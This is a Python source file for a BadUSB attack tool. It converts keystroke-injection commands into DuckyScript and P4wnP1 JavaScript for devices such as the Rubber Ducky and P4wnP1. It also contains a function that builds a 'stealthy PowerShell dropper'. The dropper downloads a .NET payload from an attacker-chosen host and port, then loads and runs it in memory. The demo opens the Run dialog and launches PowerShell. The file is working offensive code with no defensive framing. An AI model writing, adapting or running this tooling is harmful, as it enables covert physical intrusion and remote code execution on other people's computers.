import os

class UniversalConverter:
    """
    Converts high-level attack commands into device-specific payloads.
    Supports Rubber Ducky, HackPi, P4wnP1, and Standard USB.
    """

    @staticmethod
    def to_ducky(command_list):
        """Converts commands to DuckyScript."""
        ducky_script = []
        for cmd in command_list:
            if cmd['type'] == 'delay':
                ducky_script.append(f"DELAY {cmd['value']}")
            elif cmd['type'] == 'type':
                ducky_script.append(f"STRING {cmd['value']}")
            elif cmd['type'] == 'press':
                ducky_script.append(cmd['value'].upper())
            elif cmd['type'] == 'enter':
                ducky_script.append("ENTER")
        return "\n".join(ducky_script)

    @staticmethod
    def to_powershell_dropper(lhost, lport):
        """Generates a stealthy PowerShell dropper for standard USB."""
        return f"""
$u = 'http://{lhost}:{lport}/v5_payload'
$c = New-Object Net.WebClient
$d = $c.DownloadData($u)
[System.Reflection.Assembly]::Load($d).EntryPoint.Invoke($null,$null)
"""

    @staticmethod
    def to_p4wnp1_js(command_list):
        """Converts commands to P4wnP1 JS."""
        js_script = ["layout('us');", "typingSpeed(0,0);"]
        for cmd in command_list:
            if cmd['type'] == 'delay':
                js_script.append(f"delay({cmd['value']});")
            elif cmd['type'] == 'type':
                val = cmd['value'].replace('\\', '\\\\').replace('"', '\\"')
                js_script.append(f'type("{val}");')
            elif cmd['type'] == 'press':
                js_script.append(f'press("{cmd["value"]}");')
            elif cmd['type'] == 'enter':
                js_script.append('press("ENTER");')
        return "\n".join(js_script)

if __name__ == "__main__":
    commands = [
        {'type': 'press', 'value': 'GUI r'},
        {'type': 'delay', 'value': 500},
        {'type': 'type', 'value': 'powershell.exe'},
        {'type': 'enter'}
    ]
    conv = UniversalConverter()
    print("--- DuckyScript ---")
    print(conv.to_ducky(commands))
    print("\n--- P4wnP1 JS ---")
    print(conv.to_p4wnp1_js(commands))
